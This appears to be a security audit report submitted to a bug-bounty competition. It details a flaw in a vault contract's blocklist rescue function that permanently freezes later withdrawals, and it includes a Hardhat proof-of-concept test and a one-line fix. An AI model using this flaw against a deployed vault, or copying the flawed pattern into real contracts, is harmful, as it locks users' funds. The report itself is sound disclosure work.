# 89055 sc high missing period check in rescuewithdrawfromblocklisted marks a still open period as claimed causing permanent freezing of funds for any withdrawal later requested into that period

**Submitted on Aug 16th 2026 at 19:41:33 UTC by @AlexScherbatyuk for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89055
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Permanent freezing of funds

## Description

### Brief/Intro

`FirelightVault` batches withdrawals into periods where a request credits `withdrawSharesOf[P][account]` while `currentPeriod() == P - 1`, and the resulting assets are claimed once the period has ended. However, a user could be added to the blocklist that opens a new branch where a rescuer can call `rescueWithdrawFromBlocklisted` to move blocked user funds to a safe address. This mechanism has a flow that can cause a user's funds to be permanently frozen.

The implemented blocklist mechanics assume that a user could be blocklisted by calling `addToBlocklist` and removed from blocklist via `removeFromBlocklist` (e.g. user proved the case for blocklisting is false positive), allowing the user to proceed with deposit/withdraw operations.

However, in case `rescueWithdrawFromBlocklisted` has been called during the blocklisting period and removal from blocklist has happened during the same period, it creates a window when any further withdrawal requests (incease there is more funds to withdraw) would be scheduled for `P`, which has already been marked as claimed, locking user funds permanently.

This requires no trusted role to misbehave — blocklist → rescue → un-blocklist is exactly the intended handling of a false-positive blocklist, and the final trigger is a normal, permissionless withdrawal request.

According to [docs](https://docs.firelight.finance/for-stakers/deployments-and-withdrawals) current period is 1 day, but it is going to be up to 30 days period which increases the likelihood.

### Vulnerability Details

The withdrawal flow relies on a temporal invariant: pool `P` only accepts credits while `currentPeriod() == P - 1`, and `isWithdrawClaimed[P][account]` can normally only become `true` once `currentPeriod() >= P + 1` (claims are restricted to past periods). A `true` claim flag can therefore never precede a credit.

`rescueWithdrawFromBlocklisted` breaks this invariant. It has no period check, so it can set the claim flag for a **future** period that is still accepting requests:

```solidity
// FirelightVault.sol — rescueWithdrawFromBlocklisted()  (L861-L873)
for (uint256 i = 0; i < len; i++) {
    uint256 _withdrawOf = withdrawSharesOf[periods[i]][from];

    if (isWithdrawClaimed[periods[i]][from]) revert AlreadyClaimedPeriod(periods[i]);
    if (isWithdrawClaimed[periods[i]][to]) revert AlreadyClaimedPeriod(periods[i]);
    if (_withdrawOf == 0) revert NoWithdrawalAmount(periods[i]);

    withdrawSharesOf[periods[i]][to] += _withdrawOf;
    withdrawSharesOf[periods[i]][from] = 0;
    isWithdrawClaimed[periods[i]][from] = true;   // <-- flag set for a period still open for requests

    rescuedShares[i] = _withdrawOf;
}
```

`_requestWithdraw` credits the receiver without ever checking the claim flag:

```solidity
// FirelightVault.sol — _requestWithdraw()  (L1008-L1019)
uint256 period = currentPeriod() + 1;
...
withdrawAssets[period] += assets;
withdrawShares[period] += sharesWithdraw;
withdrawSharesOf[period][receiver] += sharesWithdraw;   // <-- no isWithdrawClaimed check

pendingWithdrawAssets += assets;
```

And `claimWithdraw` hard-reverts on the flag:

```solidity
// FirelightVault.sol — claimWithdraw()  (L794)
if (isWithdrawClaimed[period][sender]) revert AlreadyClaimedPeriod(period);
```

### Atack Path

{% stepper %}
{% step %}

## User creates a withdrawal request

`withdrawSharesOf[P][user] > 0`.
{% endstep %}

{% step %}

## User is blocklisted and withdrawal is rescued

The rescuer calls `rescueWithdrawFromBlocklisted(user, to, [P])`. Their shares are moved and `isWithdrawClaimed[P][user] = true` is set for the **future** period `P`.
{% endstep %}

{% step %}

## User is removed from the blocklist

The false positive is resolved, still during `P - 1`.
{% endstep %}

{% step %}

## User makes a new withdrawal request

Alternatively, any third party names them as `receiver`, which `_requestWithdraw` freely allows.

`withdrawSharesOf[P][user] += shares` succeeds and burns vault shares.
{% endstep %}
{% endstepper %}

### Impact Details

The assets of the new request in step 4 are permanently unrecoverable:

* `claimWithdraw(P)` reverts with `AlreadyClaimedPeriod`
* Recovery via rescue is also impossible, even if the user is re-blocklisted: the rescue path reverts on the same flag.
* The assets remain in `pendingWithdrawAssets` forever and are permanently excluded from `totalAssets()`. they are not even socialized back to remaining share holders. The user's burned vault shares are a total loss.

This is permanent, unrecoverable loss of user funds with no recovery path for any role, mapping to in-scope impact **#Permanent freezing of funds**. It is not "temporary freezing" (no state transition ever unlocks the funds) and not mere "griefing" (the damage is permanent loss of principal).

No trusted role needs to misbehave (blocklist → rescue → un-blocklist) is the intended resolution of a false-positive blocklist, and the final trigger is a normal, permissionless withdrawal request in the same period.

## Recommendation

Consider removing the `isWithdrawClaimed[periods[i]][from] = true` line in `rescueWithdrawFromBlocklisted`:

```diff
      withdrawSharesOf[periods[i]][to] += _withdrawOf;
      withdrawSharesOf[periods[i]][from] = 0;
-     isWithdrawClaimed[periods[i]][from] = true;

      rescuedShares[i] = _withdrawOf;
```

## References

<https://docs.firelight.finance/for-stakers/deployments-and-withdrawals>

## Proof of Concept

```solidity
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('./setup/fixtures.js')
const { expect } = require('chai')
const { ethers } = require('hardhat')

/**
 * PoC for [C-01] Rescue of a future-period withdrawal permanently locks any
 * later withdrawal credit to the rescued address.
 *
 * Root cause: rescueWithdrawFromBlocklisted() has no period validation, so it
 * sets isWithdrawClaimed[P][from] = true for a period P that is STILL OPEN for
 * new withdrawal requests. A subsequent legitimate request into the same period
 * credits withdrawSharesOf[P][from] again, but the claim flag is already true,
 * so claimWithdraw(P) reverts forever and re-rescue reverts too. The assets stay
 * stuck in pendingWithdrawAssets and are excluded from totalAssets() with no
 * recovery path.
 */
describe('[C-01] PoC: rescue of a future-period withdrawal permanently locks a later credit', function () {
  const DECIMALS = 6
  const DEPOSIT_LIMIT = ethers.parseUnits('100000', DECIMALS)
  const DEPOSIT_AMOUNT = ethers.parseUnits('6000', DECIMALS)
  const WITHDRAW_AMOUNT = ethers.parseUnits('2000', DECIMALS)

  it('locks the re-requested withdrawal permanently after an un-blocklist', async () => {
    const { token_contract, blocklister, rescuer, firelight_vault, users, utils, config } =
      await loadFixture(deployVault.bind(null, { initial_deposit_limit: DEPOSIT_LIMIT }))

    const victim = users[0]
    const rescueTo = users[2]

    // Victim deposits.
    await utils.mintAndApprove(DEPOSIT_LIMIT, victim)
    await firelight_vault.connect(victim).deposit(DEPOSIT_AMOUNT, victim.address)

    // --- Step 1: victim creates a withdrawal request. It credits period P = currentPeriod()+1,
    //             which is still OPEN (accepting requests) for the entire current period. ---
    const P = (await firelight_vault.currentPeriod()) + 1n
    await firelight_vault.connect(victim).withdraw(WITHDRAW_AMOUNT, victim.address, victim.address)
    expect(await firelight_vault.withdrawalsOf(P, victim.address)).to.eq(WITHDRAW_AMOUNT)

    // --- Step 2: victim is blocklisted (e.g. a false positive) and the pending request is rescued.
    //             rescueWithdrawFromBlocklisted has NO period check, so it acts on the FUTURE,
    //             still-open period P and sets isWithdrawClaimed[P][victim] = true. ---
    await firelight_vault.connect(blocklister).addToBlocklist(victim.address)
    await firelight_vault.connect(rescuer).rescueWithdrawFromBlocklisted(victim.address, rescueTo.address, [P])

    expect(await firelight_vault.isWithdrawClaimed(P, victim.address)).to.eq(true)
    expect(await firelight_vault.withdrawalsOf(P, victim.address)).to.eq(0)

    // --- Step 3: the block was a false positive; victim is un-blocklisted, still within period P-1. ---
    await firelight_vault.connect(blocklister).removeFromBlocklist(victim.address)
    expect(await firelight_vault.isBlocklisted(victim.address)).to.eq(false)

    // --- Step 4: victim makes a fresh, legitimate withdrawal request. Same period P is still open,
    //             so withdrawSharesOf[P][victim] is credited again. _requestWithdraw never checks
    //             the claim flag, so this SUCCEEDS and burns the victim's vault shares. ---
    expect(await firelight_vault.currentPeriod()).to.eq(P - 1n) // still the same open period
    await firelight_vault.connect(victim).withdraw(WITHDRAW_AMOUNT, victim.address, victim.address)
    expect(await firelight_vault.withdrawalsOf(P, victim.address)).to.eq(WITHDRAW_AMOUNT)

    const pendingAfterRequest = await firelight_vault.pendingWithdrawAssets()

    // Advance two periods so P is a fully past, claimable period.
    await time.increase(config.period_configuration_duration)
    await time.increase(config.period_configuration_duration)
    expect(await firelight_vault.currentPeriod()).to.be.gt(P)

    // --- Impact 1: the victim can NEVER claim. claimWithdraw(P) reverts on the stale flag. ---
    await expect(firelight_vault.connect(victim).claimWithdraw(P))
      .to.be.revertedWithCustomError(firelight_vault, 'AlreadyClaimedPeriod')
      .withArgs(P)

    // --- Impact 2: recovery via rescue is also impossible, even after re-blocklisting. ---
    await firelight_vault.connect(blocklister).addToBlocklist(victim.address)
    await expect(
      firelight_vault.connect(rescuer).rescueWithdrawFromBlocklisted(victim.address, rescueTo.address, [P])
    )
      .to.be.revertedWithCustomError(firelight_vault, 'AlreadyClaimedPeriod')
      .withArgs(P)

    // --- Impact 3: the assets are stuck in pendingWithdrawAssets forever and excluded from totalAssets(). ---
    const stuck = WITHDRAW_AMOUNT
    expect(await firelight_vault.pendingWithdrawAssets()).to.eq(pendingAfterRequest)
    expect(await firelight_vault.pendingWithdrawAssets()).to.be.gte(stuck)

    // The vault still physically holds the tokens, but they are permanently unrecoverable:
    // no claim, no re-rescue, no admin sweep. The victim's burned shares are a total loss.
    expect(await token_contract.balanceOf(firelight_vault.target)).to.be.gte(stuck)

    console.log(`\n    [C-01] Permanently locked assets: ${ethers.formatUnits(stuck, DECIMALS)} fXRP`)
    console.log(`    pendingWithdrawAssets (excluded from totalAssets forever): ${ethers.formatUnits(await firelight_vault.pendingWithdrawAssets(), DECIMALS)} fXRP\n`)
  })
})
```
